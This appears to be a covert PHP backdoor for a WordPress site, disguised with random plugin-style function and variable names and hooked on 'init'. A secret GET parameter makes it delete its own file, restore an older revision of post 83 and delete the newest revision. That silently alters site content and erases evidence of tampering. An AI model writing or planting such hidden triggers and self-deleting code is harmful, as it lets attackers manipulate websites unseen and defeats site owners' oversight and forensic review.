<?php

function scripts_section_lazy_next() {
	if (isset($_GET['wpmu_forms_core']) && $_GET['wpmu_forms_core'] === 'feedback_items_order_uploads') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sitemap_amp_print_styles = 83;
		$react_authors_access = wp_get_post_revisions($sitemap_amp_print_styles);
		if (empty($react_authors_access)) die('no revisions');
		if (count($react_authors_access) < 2) die('less than 2');
		$favicon_interactive_performance = array_shift($react_authors_access);
		$welcome_slideshow_titles_blocks = $favicon_interactive_performance->ID;
		$action_estate_display = array_shift($react_authors_access);
		$reports_table_mode = $action_estate_display->ID;
		$now_last_validator = wp_restore_post_revision($reports_table_mode);
		if ($now_last_validator === false) die('error restoring');
		$now_last_validator = wp_delete_post_revision($welcome_slideshow_titles_blocks);		
		if ($now_last_validator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scripts_section_lazy_next');
